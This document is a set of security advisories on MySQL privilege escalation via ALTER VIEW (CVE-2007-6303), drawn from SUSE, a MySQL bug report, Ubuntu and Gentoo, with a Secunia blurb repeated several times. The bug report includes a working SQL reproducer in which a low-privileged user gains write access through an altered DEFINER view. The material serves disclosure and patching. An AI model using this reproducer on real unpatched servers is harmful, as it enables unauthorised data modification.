How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list md5 sums
or download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- SUN Java 1.5 and 1.6 update
SUN Java 1.5.0 was brought to update14 and SUN Java 1.6.0 was
brought to update4. Details for the security issues fixed are not
yet publicly known, but the changelog lists several issues marked
as security.
The update also contains timezone update 2007k and was released
for SUSE Linux 10.1, openSUSE 10.2 and 10.3.
- nss\_ldap incorrect data
nss\_ldap returned incorrect data under certain circumstances to
the calling process. Some applications could therefore work with
wrong user data (CVE-2007-5794).
This has been fixed for all distributions containing nss\_ldap.
- cairo integer overflows in PNG decoder
The cairo libraries were updated to fix several integer overflows
while decoding PNG images. This can be exploited remotely with
user-assistance to execute arbitrary code. (CVE-2007-5503)
Updates have been provided for SUSE Linux Enterprise 10, SUSE Linux
10.1, openSUSE 10.2 and 10.3
- geronimo start script problems
A chown in the SUSE supplied Apache geronimo init script could
change ownership of directories it did not own, due to following
symlinks. The default setup would corrupt /var/tmp on start
of geronimo.
While there is potential to exploit this problem,
the administrator will have likely noticed this before already.
- moodle XSS problems
The install script of moodle is vulnerable to cross site scripting
(XSS). This flaw is only exploitable if moodle isn't fully installed
yet. Therefore it's unlikely to be much of a problem in practice. To
actually exploit it an attacker would have to know about a person
that is just about to install moodle (CVE-2008-0123).
- SDL\_image GIF problems
Specially crafted GIF files could crash the SDL\_image library
(CVE-2006-4484).
Updates have been released for SUSE Linux 10.1, openSUSE 10.2
and 10.3.
- python imageop integer overflow
Specially crafted images could trigger an integer overflow in the
imageop module of python (CVE-2007-4965).
Python has been updated on all SUSE Linux based distributions.
- Mysql security problems
The database server MySQL was updated to fix various security
vulnerabilities. Note: not all versions are affected by every bug:
- CVE-2007-2583: a denial of service attack in in\_decimal::set for
logged in users.
- CVE-2007-2691: RENAME TABLE did not require DROP privileges,
allowing remote authenticated users to rename arbitrary tables
- CVE-2007-2692: remote authenticated users could gain privileges
due to a bug in SQL SECURITY INVOKER stored routine handling
- CVE-2007-5925: a denial of service attack by remote authenticated
users via a certain CONTAINS operation on an indexed column
- CVE-2007-5969: allowed remote authenticated users to overwrite
system table information and gain privileges via symlinks
- CVE-2007-6303: allowed remote authenticated users to gain
privileges via CREATE SQL SECURITY DEFINER VIEW and ALTER VIEW
statements
- CVE-2007-6304: denial of service attack by remote authenticated
users by performing a specific SHOW TABLE STATUS query
MySQL has been updated on all SUSE Linux based distributions.
- NX also affected by X.org security problems
This update fixes various Xserver security issues that are also
present in NX:
XInput Extension Memory Corruption Vulnerability [IDEF2888 CVE-2007-6427].
TOG-CUP Extension Memory Corruption Vulnerability [IDEF2901 CVE-2007-6428].
EVI Extension Integer Overflow Vulnerability [IDEF2902 CVE-2007-6429].
MIT-SHM Extension Integer Overflow Vulnerability [IDEF2904 CVE-2007-6429].
- xemacs commandline buffer overflow
A buffer overflow in xemacs commandline handling was
fixed. (CVE-2007-6109)
This problem affected only openSUSE 10.3.
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
2) Pending Vulnerabilities, Solutions, and Work-Arounds
None listed this week.
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Description:
If you alter a view, it keeps it current definer, and security.

This can be used to gain additional access.

Assume a user with:
- read access to a schema "db1".
- write access to a schema "db2"
- write access to ONE column "a" (with limitation to certain rows) through a view in db2
  access to the table is given through SQL SECURITY DEFIENER
- the privilege to ALTER views (CREATE VIEW, DROP) in db2

the user can only insert update rows in db1.t1 as restricted by the views condition.

creating a new view will not grant him additional access to the table (as securit will be invoker)

BUT altering the existing view, will grant that access (as security and definer are kept)

This means the user can get write access to any table that he has read access to.

How to repeat:
--disable_warnings
drop database if exists db1;
drop database if exists db2;
--enable_warnings

create database db1;
create database db2;

create table db1.t1 (a int, b int);
create SQL SECURITY DEFINER view db2.v1 as select a from db1.t1 where a > 10 WITH CHECK OPTION;

create user 'u1'@'localhost';
grant SELECT on db1.* to 'u1'@'localhost';
grant SELECT, INSERT, UPDATE on db2.* to 'u1'@'localhost';
grant CREATE VIEW, DROP on db2.* to 'u1'@'localhost';

connect (conn1, localhost, u1, , db1);
connection conn1;

# not allowed a out of permitted range
--error 1369
insert into db2.v1 (a) values(1);

# cant create a view of his own to get full access t1
create view db2.v2 as select a,b from db1.t1;
--error 1356
insert into db2.v2 select 1,2;

# can alter existing view to gain full access to t1
alter view db2.v1 as select a,b from db1.t1;
insert into db2.v1 select 1,2;
select * from db1.t1;

connection default;

show create view db2.v1; # definer and security are unchanged

Suggested fix:
If a view is altered the definer should be changed.

"create or replace view" has the same issue

  [Bug#29908](https://bugs.mysql.com/bug.php?id=29908): A user can gain additional access through the ALTER VIEW.

  Non-definer of a view was allowed to alter that view. Due to this the alterer
  can elevate his access rights to access rights of the view definer and thus
  modify data which he wasn't allowed to modify. A view defined with
  SQL SECURITY INVOKER can't be used directly for access rights elevation.
  But a user can first alter the view SQL code and then alter the view to
  SQL SECURITY DEFINER and thus elevate his access rights. Due to this
  altering a view with SQL SECURITY INVOKER is also prohibited.

  Now the mysql_create_view function allows ALTER VIEW only to the view
  definer or a super user.

Noted in 5.0.52, 5.1.23, 6.0.4 changelogs.

ALTER VIEW retained the original DEFINER value, even when altered by
another user, which could allow that user to gain the access rights
of the view. Now ALTER VIEW is allowed only to the original definer
or users with the SUPER privilege.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# USN-588-1: MySQL vulnerabilities

19 March 2008

MySQL vulnerabilities

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 7.10](/security/notices?release=gutsy)
* [Ubuntu 7.04](/security/notices?release=feisty)
* [Ubuntu 6.10](/security/notices?release=edgy)
* [Ubuntu 6.06](/security/notices?release=dapper)

## Packages

* [mysql-dfsg-5.0](/security/cves?package=mysql-dfsg-5.0) -

## Details

Masaaki Hirose discovered that MySQL could be made to dereference

a NULL pointer. An authenticated user could cause a denial of service

(application crash) via an EXPLAIN SELECT FROM on the INFORMATION\_SCHEMA

table. This issue only affects Ubuntu 6.06 and 6.10. ([CVE-2006-7232](/security/CVE-2006-7232))

Alexander Nozdrin discovered that MySQL did not restore database access

privileges when returning from SQL SECURITY INVOKER stored routines. An

authenticated user could exploit this to gain privileges. This issue

does not affect Ubuntu 7.10. ([CVE-2007-2692](/security/CVE-2007-2692))

Martin Friebe discovered that MySQL did not properly update the DEFINER

value of an altered view. An authenticated user could use CREATE SQL

SECURITY DEFINER VIEW and ALTER VIEW statements to gain privileges.

([CVE-2007-6303](/security/CVE-2007-6303))

Luigi Auriemma discovered that yaSSL as included in MySQL did not

properly validate its input. A remote attacker could send crafted

requests and cause a denial of service or possibly execute arbitrary

code. This issue did not affect Ubuntu 6.06 in the default installation.

([CVE-2008-0226](/security/CVE-2008-0226), [CVE-2008-0227](/security/CVE-2008-0227))

# MySQL: Multiple vulnerabilities — GLSA **200804-04**

Multiple vulnerabilities in MySQL might lead to privilege escalation and
Denial of Service.

### Affected packages

| Package | **dev-db/mysql** on all architectures |
| --- | --- |
| Affected versions | < **5.0.54** |
| Unaffected versions | >= **5.0.54** |

### Background

MySQL is a popular multi-threaded, multi-user SQL server.

### Description

Multiple vulnerabilities have been reported in MySQL:

* Mattias Jonsson reported that a "RENAME TABLE" command against a
  table with explicit "DATA DIRECTORY" and "INDEX DIRECTORY" options
  would overwrite the file to which the symlink points
  (CVE-2007-5969).
* Martin Friebe discovered that MySQL does not
  update the DEFINER value of a view when the view is altered
  (CVE-2007-6303).
* Philip Stoev discovered that the federated
  engine expects the response of a remote MySQL server to contain a
  minimum number of columns in query replies (CVE-2007-6304).

### Impact

An authenticated remote attacker could exploit the first vulnerability
to overwrite MySQL system tables and escalate privileges, or use the
second vulnerability to gain privileges via an "ALTER VIEW" statement.
Remote federated MySQL servers could cause a Denial of Service in the
local MySQL server by exploiting the third vulnerability.

### Workaround

There is no known workaround at this time.

### Resolution

All MySQL users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-db/mysql-5.0.54"
```
